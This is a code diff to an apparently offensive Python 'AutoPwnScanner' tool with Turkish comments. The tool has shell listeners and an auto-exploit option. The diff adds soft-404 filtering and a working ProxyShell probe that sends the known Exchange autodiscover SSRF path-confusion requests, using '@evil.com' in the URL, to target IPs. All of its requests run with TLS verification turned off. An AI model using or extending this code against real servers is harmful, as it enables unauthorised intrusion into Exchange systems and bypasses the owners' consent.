@@ -23,6 +23,8 @@ import re
 import base64
 import struct
 
+from tools.soft404 import Soft404Detector
+
 
 class Severity(Enum):
     """Vulnerability severity levels"""
@@ -461,6 +463,9 @@ class AutoPwnScanner:
         # Shell listeners
         self.shells: Dict[str, Dict] = {}
         
+        # Soft-404 tespiti (sahte 200 yanitlari gercek acik sanilmasin)
+        self._soft404_cache: Dict[str, bool] = {}
+        
     def create_session(self, targets: List[str], auto_exploit: bool = True) -> ScanSession:
         """
         Create new Auto-Pwn scan session
@@ -543,6 +548,28 @@ class AutoPwnScanner:
         
         return session
         
+    def _real_get(self, url: str, **kwargs):
+        """
+        Soft-404 farkindalikli GET. 200 donen ama aslinda var olmayan
+        (sahte 200) sayfalari None ile eler ki yanlis pozitif 'acik' tespiti
+        olusmasin.
+        """
+        try:
+            import requests
+
+            resp = requests.get(url, timeout=kwargs.pop("timeout", 10), verify=False, **kwargs)
+        except Exception:
+            return None
+
+        if resp.status_code != 200:
+            return resp
+
+        # Imza on bellegi hedef bazli olusturulmamis olabilir
+        detector = getattr(self, "_soft404", None)
+        if detector is not None and detector.is_soft_404(resp, url):
+            return None
+        return resp
+
     def _scan_target(self, session: ScanSession, ip: str) -> Optional[Target]:
         """Scan single target"""
         target_id = hashlib.md5(f"{session.session_id}{ip}".encode()).hexdigest()[:12]
@@ -551,6 +578,15 @@ class AutoPwnScanner:
             target_id=target_id,
             ip=ip
         )
+        
+        # Bu hedef icin soft-404 imzasi olustur
+        import requests
+
+        self._soft404 = Soft404Detector(requests.Session(), verify=False)
+        for scheme in ("https", "http"):
+            self._soft404.build_baseline(f"{scheme}://{ip}")
+            if self._soft404._baseline:
+                break
         
         # Port scan
         target.ports = self._quick_port_scan(ip)
@@ -732,8 +768,27 @@ except:
     pass
 '''
         
-        return 443 in target.ports
+        return 443 in target.ports and self._proxyshell_probe(target)
         
+    def _proxyshell_probe(self, target: Target) -> bool:
+        """Soft-404 farkindalikli gercek ProxyShell yoklamasi."""
+        url = (
+            f"https://{target.ip}/autodiscover/autodiscover.json"
+            f"?@evil.com/owa/?&Email=autodiscover/autodiscover.json%3F@evil.com"
+        )
+        r = self._real_get(url, timeout=10)
+        if r is None:
+            return False
+        if "X-OWA-Version" in r.headers or "X-CalculatedBETarget" in r.headers:
+            ssrf_url = (
+                f"https://{target.ip}/autodiscover/autodiscover.json"
+                f"?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com"
+            )
+            r2 = self._real_get(ssrf_url, timeout=10, allow_redirects=False)
+            if r2 is not None and r2.status_code in [200, 302, 401]:
+                return True
+        return False
+
     def _check_zerologon(self, target: Target, vuln: Vulnerability) -> bool:
         """Check for ZeroLogon"""
         check_code = f'''
